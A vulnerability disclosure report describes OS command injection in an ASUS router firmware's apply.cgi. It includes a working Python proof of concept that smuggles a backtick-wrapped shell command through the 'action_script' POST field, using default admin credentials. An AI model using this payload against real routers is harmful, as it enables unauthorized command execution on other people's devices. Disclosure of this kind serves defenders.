

# CVE Report - Command Injection Vulnerability in FW_RT_G32_C1_5002b Routers 

## Vulnerability Title

Command Injection Vulnerability in FW_RT_G32_C1_5002b Router. 

## Vulnerability Description

ASUS FW_RT_G32_C1_5002b devices have an OS command injection vulnerability
in the CGl interface "apply.cgi",which allows remote attackers to execute arbitrary
commands via parameter "action_script" passed to the "apply.cgi" binary
through a POST request.

## POC

```python
import requests

ip = '172.17.0.33'
url = f"http://{ip}/apply.cgi"

headers = {
    "Host": ip,
    "Content-Length": "574",
    "Cache-Control": "max-age=0",
    "Authorization": "Basic YWRtaW46YWRtaW4=",
    "Accept-Language": "zh-CN",
    "Upgrade-Insecure-Requests": "1",
    "Origin": f"http://{ip}",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": f"http://{ip}/Advanced_Wireless_Content.asp",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive"
}

data = {
    'action_script': '`touch 1.txt`',
    'action_mode': 'WlanUpdate '
}

response = requests.post(url, headers=headers, data=data)

print("Status Code:", response.status_code)
print("Response Body:", response.text)

```



## Cause Analysis

The get_cgi function accepts external data. The user affects v7 by setting the action_script value. It enters system execution, resulting in a command execution vulnerability.

![image-20241229162343975](C:\Users\XiaoA\AppData\Roaming\Typora\typora-user-images\image-20241229162343975.png)

## Suggested Fix

It is recommended to update to the version of FW_RT_G32_C1_5002b router to fix this vulnerability. 

